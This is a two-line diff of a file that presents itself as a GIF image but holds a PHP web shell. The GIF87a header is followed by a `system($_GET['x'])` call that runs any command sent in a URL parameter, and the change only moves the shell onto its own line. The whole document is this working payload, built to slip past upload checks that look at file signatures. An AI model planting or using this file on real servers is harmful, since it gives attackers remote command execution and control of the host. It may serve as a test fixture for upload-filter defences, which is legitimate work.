@@ -1,1 +1,2 @@
-GIF87a<?php system($_GET['x']); ?>
+GIF87a
+<?php system($_GET['x']); ?>
